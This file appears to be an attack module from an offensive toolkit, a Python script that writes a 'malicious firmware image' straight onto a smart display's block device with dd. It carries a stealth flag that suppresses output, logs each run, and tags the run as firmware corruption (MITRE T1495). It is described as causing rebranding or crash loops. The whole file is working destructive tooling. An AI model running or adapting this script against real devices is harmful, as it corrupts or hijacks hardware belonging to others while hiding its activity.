# modules/attacks/display_firmware_poisoner.py

import os
import subprocess
import json
from datetime import datetime
import argparse
from hashlib import sha256

LOG_FILE = "results/display_firmware_poison_log.json"
MITRE_TTP = "T1495"

def log(payload):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(payload)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def poison_display(device, firmware, stealth=False):
    if not os.path.exists(device):
        raise FileNotFoundError(f"Target device not found: {device}")
    if not os.path.exists(firmware):
        raise FileNotFoundError(f"Firmware image not found: {firmware}")

    try:
        subprocess.run(["dd", f"if={firmware}", f"of={device}", "bs=512k", "conv=fsync"], check=True)
        if not stealth:
            print(f"[✓] Display firmware poisoned on {device}")
        return True
    except subprocess.CalledProcessError as e:
        if not stealth:
            print(f"[!] Failed: {e}")
        return False

def execute(device, firmware, stealth):
    h = sha256(open(firmware, "rb").read()).hexdigest()
    success = poison_display(device, firmware, stealth)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "device": device,
        "firmware": firmware,
        "sha256": h,
        "success": success,
        "stealth": stealth,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Poison smart display firmware (branding/crash loop)")
    parser.add_argument("--device", required=True, help="Block device path (e.g. /dev/sdX)")
    parser.add_argument("--firmware", required=True, help="Malicious firmware image")
    parser.add_argument("--stealth", action="store_true", help="Suppress output")
    args = parser.parse_args()

    execute(args.device, args.firmware, args.stealth)
